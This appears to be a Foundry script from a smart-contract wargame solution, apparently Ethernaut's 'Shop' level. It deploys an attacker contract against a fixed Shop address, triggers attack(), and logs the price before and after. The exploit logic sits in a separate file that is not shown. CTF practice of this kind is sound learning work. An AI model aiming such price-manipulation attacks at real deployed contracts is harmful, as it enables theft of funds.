// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import {Script} from "forge-std/Script.sol";
import {Shop} from "../src/level21/Shop.sol";
import {AttackShop} from "../src/level21/AttackShop.sol";

import "forge-std/console.sol";

contract level21Exploit is Script {
    Shop shop = Shop(0x9173464f7c419670ABB705d703933D45cA262D5a);
    AttackShop attackShop;

    function run() external {
        vm.startBroadcast();
        console.log("Price: ", shop.price());
        attackShop = new AttackShop(address(shop));
        attackShop.attack();

        console.log("Price: ", shop.price());
        vm.stopBroadcast();
    }
}
